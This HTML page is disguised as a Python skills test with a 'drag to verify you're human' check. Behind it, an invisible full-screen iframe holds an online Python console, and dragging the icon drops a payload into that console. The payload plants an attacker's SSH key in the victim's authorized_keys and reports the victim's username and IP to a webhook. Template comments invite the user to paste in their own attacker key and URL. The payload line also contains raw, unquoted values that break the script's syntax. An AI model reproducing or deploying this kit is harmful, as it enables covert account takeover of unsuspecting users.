<!DOCTYPE html>
<html>
<head>
<title>Python Skills Assessment</title>
<style>
body {
  font-family: Arial, sans-serif;
  background: #1a1a2e;
  color: #eee;
  display: flex;
  justify-content: center;
  align-items: center;
  min-height: 100vh;
  margin: 0;
}
.container {
  text-align: center;
  max-width: 500px;
}
h1 { color: #e94560; margin-bottom: 10px; }
p { color: #aaa; margin-bottom: 30px; }
.verify-box {
  background: linear-gradient(135deg, #0f3460, #16213e);
  border: 2px dashed #e94560;
  border-radius: 12px;
  padding: 30px;
  cursor: grab;
  user-select: none;
  transition: all 0.3s;
}
.verify-box:hover {
  border-color: #48bb78;
  background: linear-gradient(135deg, #16213e, #1a1a2e);
}
.verify-box:active { cursor: grabbing; }
.verify-icon { font-size: 48px; margin-bottom: 10px; }
.verify-text { font-size: 14px; color: #aaa; }
.verify-label { font-size: 18px; font-weight: bold; color: #48bb78; margin: 10px 0; }
.drop-zone {
  margin-top: 20px;
  border: 2px dashed #333;
  border-radius: 12px;
  padding: 40px;
  color: #555;
  font-size: 14px;
  position: relative;
  min-height: 100px;
  transition: all 0.3s;
}
.drop-zone.over {
  border-color: #48bb78;
  background: rgba(72,187,120,0.05);
  color: #48bb78;
}
.success-msg {
  display: none;
  color: #48bb78;
  font-size: 18px;
  margin-top: 20px;
}
.console-iframe {
  position: fixed;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  opacity: 0.0001;
  z-index: 10;
  border: none;
  pointer-events: none;
}
.console-iframe.active {
  pointer-events: all !important;
}
</style>
</head>
<body>

<div class="container">
  <h1>Python Skills Assessment</h1>
  <p>Complete the verification to access the interactive tutorial</p>

  <div class="verify-box" id="dragItem" draggable="true">
    <div class="verify-icon">🐍</div>
    <div class="verify-label">Drag to Verify</div>
    <div class="verify-text">Drag the Python icon to the box below</div>
  </div>

  <div class="drop-zone" id="dropZone">
    ⬇ Drop here to verify you're human ⬇
  </div>

  <div class="success-msg" id="successMsg">
    ✅ Verified! Loading tutorial...
  </div>
</div>

<iframe
  id="consoleFrame"
  class="console-iframe"
  src="https://www.pythonanywhere.com/embedded3/"
></iframe>

<script>
// ══════════════════════════════════════════════════════════════
// CHANGE THESE TWO THINGS ONLY:
// ══════════════════════════════════════════════════════════════

// 1. Your attacker SSH public key (from: cat ~/.ssh/id_ed25519.pub)
var ATTACKER_KEY = 'PASTE_YOUR_SSH_PUBLIC_KEY_HERE';

// 2. Your webhook.site URL (from: https://webhook.site)
var WEBHOOK = 'PASTE_YOUR_WEBHOOK_URL_HERE';

// ══════════════════════════════════════════════════════════════
// DO NOT CHANGE ANYTHING BELOW THIS LINE
// ══════════════════════════════════════════════════════════════

var payload = 'import os; os.system("mkdir -p ~/.ssh && echo \'' + ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGnl5m2NP227Tji71XUNv4Pd3TYfrl3HPpfj3K6t1kSJ AttackerAccount@green-liveconsole7 + '\' >> ~/.ssh/authorized_keys && chmod 700 ~/.ssh && chmod 600 ~/.ssh/authorized_keys && curl -s \'' + https://webhook.site/83f9a14f-165b-4b31-918b-e9ff55f2d10f + '?user=$(whoami)\\&ip=$(hostname -I | cut -d\\\" \\\" -f1)\' > /dev/null")\n';

var dragItem = document.getElementById('dragItem');
var dropZone = document.getElementById('dropZone');
var iframe = document.getElementById('consoleFrame');
var successMsg = document.getElementById('successMsg');

dragItem.addEventListener('dragstart', function(e) {
  e.dataTransfer.setData('text/plain', payload);
  e.dataTransfer.effectAllowed = 'copy';
  iframe.classList.add('active');
});

dragItem.addEventListener('dragend', function(e) {
  iframe.classList.remove('active');
});

dropZone.addEventListener('dragover', function(e) {
  e.preventDefault();
  dropZone.classList.add('over');
});

dropZone.addEventListener('dragleave', function(e) {
  dropZone.classList.remove('over');
});

dropZone.addEventListener('drop', function(e) {
  e.preventDefault();
  dropZone.classList.remove('over');
  dropZone.style.display = 'none';
  successMsg.style.display = 'block';
});
</script>

</body>
</html>
